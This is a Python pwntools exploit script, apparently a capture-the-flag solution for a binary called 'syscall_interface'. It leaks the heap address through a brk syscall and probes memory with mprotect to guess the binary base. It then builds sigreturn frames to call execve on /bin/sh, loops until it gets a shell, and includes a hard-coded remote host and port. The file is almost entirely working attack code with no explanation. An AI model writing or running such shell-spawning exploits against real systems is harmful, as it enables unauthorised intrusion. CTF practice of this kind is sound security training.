#!/usr/bin/env python
from pwn import *

context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])  # open new window

# libc = ELF('')
elf = ELF('./syscall_interface')
context(os='linux', arch=elf.arch)
#context(log_level='debug')  # output verbose log

RHOST = "139.180.144.86"
RPORT = 20004
LHOST = "127.0.0.1"
LPORT = 20004

def section_addr(name, elf=elf):
    return elf.get_section_by_name(name).header['sh_addr']

def dbg(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

conn = None
opt = sys.argv.pop(1) if len(sys.argv) > 1 else '?'  # pop option
if opt in 'rl':
    conn = remote(*{'r': (RHOST, RPORT), 'l': (LHOST, LPORT)}[opt])
elif opt == 'd':
    gdbscript = """
    continue
    """.format(hex(elf.symbols['main'] if 'main' in elf.symbols.keys() else elf.entrypoint))
    conn = gdb.debug(['./syscall_interface'], gdbscript=gdbscript)
else:
    conn = process(['./syscall_interface'])
    # conn = process(['./syscall_interface'], env={'LD_PRELOAD': ''})
    if opt == 'a': gdb.attach(conn)


def change(a):
    conn.sendlineafter('choice:', '1')
    conn.sendlineafter('username',a)
def syscall(n, a):
    conn.sendlineafter('choice:', '0')
    conn.sendlineafter(':', str(n))
    conn.sendlineafter(':', str(a))
# exploit
log.info('Pwning')


ofs = 0xd5a000
i = 0
while True:
    print i
    i += 1
    try:
        conn = process(['./syscall_interface'])
        # conn = remote(RHOST, RPORT)
        bin_base = 0
        syscall(12, 0)
        conn.recvuntil('RET(')
        heap_base = int(conn.recv(len('0x555555757000')), 16)
        dbg('heap_base')

        syscall(22, heap_base - ofs)
        conn.recvuntil('RET(')
        result = int(conn.recvuntil(')')[:-1], 16)
        if result == 0:
            bin_base = heap_base - ofs - 0x202000
            dbg('bin_base')
        syscall(22, heap_base - ofs - 0x1000)
        conn.recvuntil('RET(')
        result = int(conn.recvuntil(')')[:-1], 16)
        if result == 0:
            bin_base = heap_base - ofs - 0x202000 - 0x1000
            dbg('bin_base')
        if bin_base == 0:
            bin_base = heap_base - ofs - 0x2000

        payload =  p64(heap_base + 0x1000) # rbp
        payload += p64(0)#
        payload += p64(0x400)       # rdx
        payload += p64(heap_base + 0x1000-8)            #
        payload += p64(0)           # rcx
        payload += p64(heap_base + 0x1000)            # rsp
        payload += p64(bin_base + 0xc81)            # rip
        payload += p64(0)
        payload += p64(0x002b000000000033)
        payload += p64(0)
        payload += p64(0)
        payload += p64(0)
        payload += p64(0)
        change(payload)
        syscall(15, 0xdeadbeef)

        payload = p64(bin_base + 0x000010c3)
        payload += p64(15)
        payload += p64(bin_base + 0x00000ec8)
        payload += p64(0xdeadbeef) * 4
        payload += p64(0) * 8
        payload += p64(59)       # rdi
        payload += p64(heap_base + 0x1100)  # rsi
        payload += p64(0)       # rbp
        payload += p64(0) * 2
        payload += p64(0)       # rax
        payload += p64(0)
        payload += p64(heap_base+0x2000)
        payload += p64( 0x00000ec8 + bin_base )
        payload += p64(0)
        payload += p64(0x002b000000000033)
        payload += p64(0)*5
        payload += p64(heap_base + 0x1100) + p64(0)
        conn.sendline(payload + '/bin/sh\x00')
        conn.sendline('\n\n\n\necho unko')
        conn.recvuntil('unko', timeout=3)
        conn.interactive()
    except:
        conn.close()